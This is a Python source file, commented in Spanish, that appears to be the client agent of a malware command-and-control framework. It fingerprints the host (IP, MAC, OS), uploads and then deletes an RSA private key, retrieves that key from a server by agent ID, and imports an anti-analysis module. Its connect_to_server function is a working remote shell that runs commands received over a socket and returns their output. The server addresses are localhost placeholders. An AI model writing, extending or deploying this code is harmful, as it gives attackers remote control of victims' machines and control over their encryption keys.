import requests
import socket
import os
import json
import platform
import antianalysis
import subprocess

# Variable global para almacenar el ID del agente
agent_id = None

def get_ip_address():
    ip = socket.gethostbyname(socket.gethostname())
    return ip

def load_private_key():
    try:
        with open("rsa_private.pem", 'rb') as f:
            private_key = f.read()
        return private_key
    except FileNotFoundError:
        print("El archivo de clave privada no fue encontrado.")
        return None

# Establecer el agent_id en un archivo
def set_agent_id(id):
    with open("agent_id.json", "w") as file:
        json.dump({"agent_id": id}, file)

# Obtener el agent_id desde el archivo
def get_agent_id():
    try:
        with open("agent_id.json", "r") as file:
            data = json.load(file)
            return data.get("agent_id")
    except (FileNotFoundError, json.JSONDecodeError):
        return None


def register_agent():
    ip = get_ip_address()
    mac = antianalysis.get_mac_address()
    so = platform.system() + platform.version()
    private_key = load_private_key()

    if private_key is None:
        print("No se pudo cargar la clave privada. No se puede registrar el agente.")
        return None
    
    server_url = 'http://127.0.0.1:5000/register_agent'
    data = {
        'ip': ip,
        'mac': mac,
        'so': so 
    }
    files = {
        'private_key': ('rsa_private.pem', private_key, 'application/x-pem-file')
    }

    response = requests.post(server_url, data=data, files=files)    
    if response.status_code == 200:
        response_json = response.json()
        agent_id = response_json.get('agent_id')
        set_agent_id(agent_id)  # Guardar el ID en JSON 
        print(f"Agente registrado con éxito. ID: {agent_id}")
        os.remove("rsa_private.pem")  # Eliminar la clave privada después de transmitirla correctamente
    else:
        print(f"Error al registrar el agente: {response.text}")
        return None

def get_private_key():
    # Obtener el ID del agente desde memoria
    agent_id = get_agent_id()
    if agent_id is None:
        print("No se ha registrado un agente. No se puede obtener la clave privada.")
        return None

    server_url = f'http://127.0.0.1:5000/download_private_key/{agent_id}'
    
    # Realizar la solicitud GET para obtener el archivo .pem
    response = requests.get(server_url)
    
    if response.status_code == 200:
        # Guardar la clave privada en un archivo en el sistema del cliente
        with open('rsa_private.pem', 'wb') as f:
            f.write(response.content)
        print("Clave privada descargada con éxito.")
    else:
        print(f"Error al descargar la clave privada: {response.text}")

    # Función para conectar el agente al servidor de sockets
def connect_to_server():
    server_host = '127.0.0.1'
    server_port = 5001  # Puerto del servidor de sockets
    try:
        agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        agent_socket.connect((server_host, server_port))
        print("Conexión establecida con el servidor de sockets.")
        
        while True:
            command = agent_socket.recv(1024).decode('utf-8')
            if command.lower() == "exit":
                break

            if command:
                # Ejecutar el comando y devolver la salida
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout if result.stdout else result.stderr
                agent_socket.send(output.encode('utf-8'))
        
        agent_socket.close()
    except Exception as e:
        print(f"Error al conectar al servidor: {e}")

# Función principal del cliente
def main():
   
        get_private_key()

if __name__ == "__main__":
    main()
